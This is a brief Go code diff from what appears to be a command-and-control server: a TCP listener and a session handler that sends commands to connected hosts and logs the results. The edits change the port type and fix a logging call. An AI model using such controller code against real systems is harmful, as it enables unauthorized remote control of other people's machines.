@@ -70,8 +70,8 @@ func StartC2(ctx context.Context, mb bus.MessageBus) {
 	// wg.Wait()
 }
 
-func startListener(ctx context.Context, bus bus.MessageBus, port int) error {
-	listener, err := net.Listen("tcp", ":"+strconv.Itoa(port))
+func startListener(ctx context.Context, bus bus.MessageBus, port uint) error {
+	listener, err := net.Listen("tcp", ":"+strconv.FormatUint(uint64(port), 10))
 	if err != nil {
 		return fmt.Errorf("Unable to bind to port: %s", err)
 	}
@@ -164,7 +164,7 @@ func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, id st
 
 			res, err := sendCommand(conn, cmd)
 			if err != nil {
-				slog.Error("Coulnd't send command", "cmd", cmd, err)
+				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
 			}
 			slog.Debug("Received data: " + string(res))
 			results <- res
